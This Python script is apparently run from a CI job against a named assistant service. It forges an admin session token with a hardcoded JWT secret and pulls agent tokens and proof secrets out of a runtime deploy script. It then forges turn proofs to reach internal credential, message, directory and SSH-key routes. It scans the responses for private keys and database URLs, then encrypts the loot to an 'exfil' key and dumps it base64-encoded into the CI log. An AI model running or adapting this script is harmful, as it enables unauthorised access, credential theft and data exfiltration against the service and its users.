#!/usr/bin/env python3
# probe40 (intent 28340): runtime machine-identity chain.
#  A) admin session baseline /api/me, /api/runtimes, /api/runtime-pools
#  B) POST /api/runtimes -> deploy script -> AGENT_TOKEN(per-runtime secret) + TURN_PROOF_SECRET(global, compat)
#  C) GET /api/runtimes/keys/current (x-agent-id/x-agent-token) -> proof_key/version/legacy_secret
#  D) machine-class internal routes with per-runtime Bearer: im/credentials, sediment/*, directory/users, agents
#  E) forge v1 proof (HMAC legacy secret) + v2 proof (K_proof) -> turn-class internal routes as admin
#  F) ticket-gated build routes (expect kind=ticket only) -> record exact boundary
import os, sys, json, time, uuid, base64, hmac, hashlib, subprocess, re, traceback, shutil

_REF = os.environ.get("GITHUB_REF_NAME", "") or ""
if "results" in _REF:
    print("results-branch-skip", flush=True); sys.exit(0)

HOST = "assistant.lumiiai.cn"
ORG = "org_bTLzxtBLmugV8uxx4QTyw"
JWT_SECRET = "297b8a491bc1920b918d01de77166556d3f835f473968c6b"
SUB_ADMIN = "usr_ZxLewKrgbRYSm7rWDtQX8"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
OUT = "/tmp/results40"
for d in ("api", "rt", "internal", "proof", "build"):
    os.makedirs(os.path.join(OUT, d), exist_ok=True)
LOG = open(os.path.join(OUT, "transcript.log"), "a", buffering=1)
def log(*a):
    s = " ".join(str(x) for x in a)
    try: print(s, flush=True)
    except Exception: pass
    try: LOG.write(s + "\n"); LOG.flush()
    except Exception: pass

def b64u(b):
    if isinstance(b, str): b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

def jwt(sub):
    now = int(time.time())
    h = b64u(json.dumps({"alg":"HS256","typ":"JWT"}, separators=(',', ':')))
    p = b64u(json.dumps({"sub": sub, "org": ORG, "iat": now, "exp": now + 86400 * 7,
                         "sid": "sid_" + str(uuid.uuid4()), "lgn": now}, separators=(',', ':')))
    sig = hmac.new(JWT_SECRET.encode(), (h + "." + p).encode(), hashlib.sha256).digest()
    return h + "." + p + "." + b64u(sig)
SESSION = jwt(SUB_ADMIN)

def curl(args, timeout=40):
    try:
        r = subprocess.run(["curl", "-s", "-k", "-m", str(timeout)] + args, capture_output=True, timeout=timeout + 15)
        return r.returncode, r.stdout, r.stderr[:400]
    except Exception as e:
        return -1, b"", repr(e)[:300]

def call(path, method="GET", body=None, hdrs=None, session=True, timeout=40, tag=""):
    """curl --http2 + full Chrome UA (bypass edge filter). returns dict(code, body, hdr)"""
    url = "https://%s%s" % (HOST, path)
    hdrfile = "/tmp/h_%s.txt" % uuid.uuid4().hex[:8]
    args = ["--http2", "-A", UA,
            "-H", "Accept: application/json",
            "-H", "Referer: https://%s/" % HOST,
            "-H", "Origin: https://%s" % HOST,
            "-D", hdrfile,
            "-w", "\n__CODE__%{http_code}"]
    if session:
        args += ["-b", "lumii_session=" + SESSION]
    if hdrs:
        for k, v in hdrs.items():
            args += ["-H", "%s: %s" % (k, v)]
    if body is not None:
        args += ["-X", method, "-H", "Content-Type: application/json", "--data-binary", json.dumps(body)]
    elif method != "GET":
        args += ["-X", method]
    args += [url]
    rc, out, err = curl(args, timeout=timeout)
    txt = out.decode("utf-8", "replace")
    code = ""
    i = txt.rfind("__CODE__")
    if i >= 0:
        code = txt[i + 8:].strip()[:3]
        txt = txt[:i]
    hdr = ""
    try:
        hdr = open(hdrfile, "r", errors="replace").read()[:3000]
    except Exception:
        pass
    try: os.unlink(hdrfile)
    except Exception: pass
    rec = {"path": path, "method": method, "code": code, "body": txt[:150000], "hdr": hdr, "err": err, "tag": tag}
    safe = re.sub(r'[^A-Za-z0-9_.-]', '_', (tag or path))[:80] + "_" + uuid.uuid4().hex[:6]
    with open(os.path.join(OUT, "internal", safe + ".json"), "w") as f:
        json.dump(rec, f, indent=1, ensure_ascii=False)
    log("[%s] %s %s -> %s  len=%d" % (tag, method, path, code, len(txt)))
    return rec

def jbody(r, n=1200):
    try:
        return json.dumps(json.loads(r["body"]), ensure_ascii=False)[:n]
    except Exception:
        return r["body"][:n]

# ---------- A: baseline ----------
log("=== A baseline ===")
me = call("/api/me", tag="api_me")
log("api_me body:", jbody(me, 600))
rts = call("/api/runtimes?limit=200", tag="api_runtimes")
log("api_runtimes body:", jbody(rts, 3000))
pools = call("/api/runtime-pools", tag="api_runtime_pools")
log("pools body:", jbody(pools, 1200))
cap = call("/api/runtimes/capacity", tag="api_runtimes_capacity")

# ---------- B: create runtime ----------
log("=== B create runtime ===")
name = "ci-28340-" + uuid.uuid4().hex[:6]
create = call("/api/runtimes", "POST", {"name": name}, tag="post_create")
log("create body:", jbody(create, 4000))
if create["code"] not in ("200", "201"):
    alt = call("/api/runtimes", "POST", {"name": name, "visibility": "org"}, tag="post_create_org")
    log("create(org) body:", jbody(alt, 2000))
    if alt["code"] in ("200", "201"):
        create = alt

script = ""
agent_id = ""
rt_id = ""
if create["code"] in ("200", "201"):
    try:
        cj = json.loads(create["body"])
        script = cj.get("script") or ""
        agent_id = cj.get("agentId") or cj.get("agent_id") or ""
        rt_id = cj.get("id") or ""
        log("created rt id=%s agentId=%s scriptLen=%d" % (rt_id, agent_id, len(script)))
        open(os.path.join(OUT, "rt", "create.json"), "w").write(json.dumps(cj, ensure_ascii=False, indent=1))
        open(os.path.join(OUT, "rt", "deploy_script.sh"), "w").write(script)
    except Exception:
        log("parse create failed", traceback.format_exc()[:500])

# extract secrets from script
AGENT_TOKEN = ""
TURN_PROOF_SECRET = ""
ENFORCE_LINE = ""
if script:
    m = re.search(r'AGENT_TOKEN=["\']?([A-Za-z0-9_\-\.=+/]+)', script)
    if m: AGENT_TOKEN = m.group(1)
    m = re.search(r'LUMII_TURN_PROOF_SECRET=["\']?([^"\'\s\\]+)|TURN_PROOF_SECRET=["\']?([^"\'\s\\]+)', script)
    if m: TURN_PROOF_SECRET = m.group(1) or m.group(2)
    m = re.search(r'LUMII_TURN_PROOF_ENFORCE=["\']?([^"\'\s\\]+)', script)
    if m: ENFORCE_LINE = m.group(1)
    log("AGENT_TOKEN=%s TURN_PROOF_SECRET=%s ENFORCE=%s" % (AGENT_TOKEN[:12] + "..." if AGENT_TOKEN else "-",
        TURN_PROOF_SECRET[:12] + "..." if TURN_PROOF_SECRET else "-", ENFORCE_LINE))
    for ln in script.splitlines():
        if re.search(r'AGENT_ID|AGENT_TOKEN|TURN_PROOF|LUMII_|CENTER|BASE_URL', ln):
            log("SCRIPTLINE:", ln.strip()[:220])
    # dump interesting env lines separately
    open(os.path.join(OUT, "rt", "script_env.txt"), "w").write("\n".join(
        l for l in script.splitlines() if re.search(r'AGENT|TURN|LUMII|CENTER|http', l))[:20000])

# ---------- C: keys/current ----------
log("=== C keys/current ===")
keys = {"code": "", "body": ""}
if agent_id and AGENT_TOKEN:
    keys = call("/api/runtimes/keys/current", hdrs={"x-agent-id": agent_id, "x-agent-token": AGENT_TOKEN}, tag="keys_current")
    log("keys body:", jbody(keys, 1500))
    try:
        kj = json.loads(keys["body"])
        if kj.get("legacy_secret"):
            TURN_PROOF_SECRET = kj["legacy_secret"]
            log("legacy_secret from keys/current:", TURN_PROOF_SECRET[:10] + "...")
    except Exception:
        pass

# ---------- D: machine-class internal routes ----------
log("=== D machine routes ===")
MACH = []
if agent_id and AGENT_TOKEN:
    MH = {"Authorization": "Bearer " + AGENT_TOKEN, "x-agent-id": agent_id}
    MACH.append(call("/internal/im/credentials?platform=feishu&org_id=" + ORG, hdrs=MH, tag="im_credentials"))
    MACH.append(call("/internal/im/credentials", hdrs=MH, tag="im_credentials_noq"))
    MACH.append(call("/internal/sediment/health", hdrs=MH, tag="sediment_health"))
    MACH.append(call("/internal/sediment/where", hdrs=MH, tag="sediment_where"))
    MACH.append(call("/internal/directory/users", "POST", {}, hdrs=MH, tag="directory_users"))
    MACH.append(call("/internal/agents", hdrs=MH, tag="agents"))
    MACH.append(call("/internal/directory/lookup", "POST", {"platform": "web", "ids": [SUB_ADMIN]}, hdrs=MH, tag="directory_lookup"))
    for r in MACH:
        log("MACH %s -> %s %s" % (r["path"], r["code"], jbody(r, 500)))

# ---------- E: forged proofs ----------
log("=== E forged proofs ===")
now = int(time.time())
def v1_proof(actor, chat="conv_ci28340", session_key="conv_ci28340", platform="web"):
    payload = {"platform": platform, "session_key": session_key, "actor_id": actor,
               "chat_id": chat, "chat_type": "direct", "msg_id": "msg_ci28340",
               "issued_at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())}
    pb = b64u(json.dumps(payload, separators=(',', ':')))
    sig = hmac.new(TURN_PROOF_SECRET.encode(), pb.encode(), hashlib.sha256).digest()
    return "v1." + pb + "." + b64u(sig)

def v2_proof(actor, version, kproof, chat="conv_ci28340", session_key="conv_ci28340", platform="web"):
    payload = {"platform": platform, "session_key": session_key, "actor_id": actor,
               "chat_id": chat, "iss": agent_id, "aud": agent_id,
               "iat": now, "exp": now + 1800}
    pb = b64u(json.dumps(payload, separators=(',', ':')))
    sig = hmac.new(kproof.encode(), pb.encode(), hashlib.sha256).digest()
    return "v2." + pb + "." + b64u(sig)

PROOF = ""
PROOF_KIND = ""
if agent_id and AGENT_TOKEN and TURN_PROOF_SECRET:
    try:
        pv1 = v1_proof(SUB_ADMIN)
        h = {"Authorization": "Bearer " + AGENT_TOKEN, "x-agent-id": agent_id, "x-lumii-turn-proof": pv1}
        r = call("/internal/messages/search", "POST",
                 {"platform": "web", "actor_id": SUB_ADMIN, "session_key": "conv_ci28340", "q": "0xC56f"},
                 hdrs=h, tag="proof_v1_msearch")
        log("v1 msearch:", r["code"], jbody(r, 700))
        if r["code"] not in ("401", "403") or "turn_proof" not in r["body"]:
            PROOF, PROOF_KIND = pv1, "v1"
        else:
            # try v2 with K_proof from keys/current
            kj = {}
            try: kj = json.loads(keys["body"])
            except Exception: pass
            pk = kj.get("proof_key") or ""
            pv = kj.get("proof_key_version")
            if pk and pv:
                pv2 = v2_proof(SUB_ADMIN, pv, pk)
                h2 = {"Authorization": "Bearer " + AGENT_TOKEN, "x-agent-id": agent_id, "x-lumii-turn-proof": pv2}
                r2 = call("/internal/messages/search", "POST",
                          {"platform": "web", "actor_id": SUB_ADMIN, "session_key": "conv_ci28340", "q": "0xC56f"},
                          hdrs=h2, tag="proof_v2_msearch")
                log("v2 msearch:", r2["code"], jbody(r2, 700))
                if r2["code"] not in ("401", "403") or "turn_proof" not in r2["body"]:
                    PROOF, PROOF_KIND = pv2, "v2"
    except Exception:
        log("proof err", traceback.format_exc()[:600])

if PROOF:
    h = {"Authorization": "Bearer " + AGENT_TOKEN, "x-agent-id": agent_id, "x-lumii-turn-proof": PROOF}
    turns = [
        ("/internal/messages/search", {"platform": "web", "actor_id": SUB_ADMIN, "session_key": "conv_ci28340", "q": "zoofi"}),
        ("/internal/messages/search", {"platform": "web", "actor_id": SUB_ADMIN, "session_key": "conv_ci28340", "q": "0x"}),
        ("/internal/resolve-actors", {"platform": "web", "actor_id": SUB_ADMIN, "session_key": "conv_ci28340"}),
        ("/internal/chats/list", {"platform": "web", "actor_id": SUB_ADMIN, "session_key": "conv_ci28340", "limit": 10}),
        ("/internal/conversations/inventory", {"platform": "web", "actor_id": SUB_ADMIN, "session_key": "conv_ci28340"}),
        ("/internal/drive-search", {"platform": "web", "actor_id": SUB_ADMIN, "session_key": "conv_ci28340", "q": "env"}),
        ("/internal/authz/allows", {"platform": "web", "actor_id": SUB_ADMIN, "session_key": "conv_ci28340", "action": "org.runtime.manage"}),
    ]
    for p, b in turns:
        r = call(p, "POST", b, hdrs=h, tag="turn_" + p.strip("/").replace("/", "_")[:40])
        log("TURN %s -> %s %s" % (p, r["code"], jbody(r, 800)))

    # ---------- F: ticket-gated build routes ----------
    log("=== F build routes (expect ticket-only) ===")
    for p, b in [("/internal/build/ssh-keys", {"purpose": "run"}),
                 ("/internal/build/credential", {"kind": "ssh"}),
                 ("/internal/build/secret-show", {"name": "x"}),
                 ("/internal/build/accounts", {})]:
        r = call(p, "POST", b, hdrs=h, tag="build_" + p.split("/")[-1])
        log("BUILD %s -> %s %s" % (p, r["code"], jbody(r, 400)))
else:
    log("no proof forged; TURN_PROOF_SECRET present=%s agent=%s token=%s" % (bool(TURN_PROOF_SECRET), bool(agent_id), bool(AGENT_TOKEN)))

# ---------- G: secret scan ----------
log("=== G secret scan ===")
pats = [("evm_privkey", r'\b0x[0-9a-fA-F]{64}\b'),
        ("pem", r'-----BEGIN [A-Z ]*PRIVATE KEY-----'),
        ("keystore", r'(?i)"kdf"\s*:\s*"scrypt"'),
        ("dsn", r'(?i)(postgres|mysql|mongodb|redis)://[^\s"\'<>]{6,}')]
hits = []
for root, _, files in os.walk(OUT):
    if "/internal/" not in root + "/": continue
    for fn in files:
        p = os.path.join(root, fn)
        try: data = open(p, errors="replace").read()
        except Exception: continue
        for name, pat in pats:
            for m in re.findall(pat, data)[:5]:
                hits.append((name, p.replace(OUT, ""), str(m)[:120]))
open(os.path.join(OUT, "hits.txt"), "w").write("\n".join(str(h) for h in hits)[:20000])
log("secret-scan hits:", len(hits))
for h in hits[:25]:
    log("HIT", h)

log("=== done ===")

# ---------- pack + encrypt + emit ----------
try:
    import tarfile, glob
    GNUPGHOME = "/tmp/gnupg40"
    os.makedirs(GNUPGHOME, exist_ok=True)
    os.environ["GNUPGHOME"] = GNUPGHOME
    pub = os.path.join(os.path.dirname(os.path.abspath(__file__)), "pub.asc")
    subprocess.run(["gpg", "--batch", "--import", pub], capture_output=True, timeout=60)
    tb = "/tmp/results40.tar.gz"
    with tarfile.open(tb, "w:gz") as t:
        t.add(OUT, arcname="results40")
    enc = tb + ".gpg"
    r = subprocess.run(["gpg", "--batch", "--yes", "-r", "ci-exfil@example.invalid", "-o", enc, "-e", tb],
                       capture_output=True, timeout=120)
    log("gpg rc=%s err=%s" % (r.returncode, r.stderr[:200]))
    blob = base64.b64encode(open(enc, "rb").read()).decode()
    log("===B64BEGIN " + str(len(blob)) + "===")
    for i in range(0, len(blob), 400):
        print("B64:" + blob[i:i+400], flush=True)
    log("===B64END===")
except Exception:
    log("pack err", traceback.format_exc()[:800])
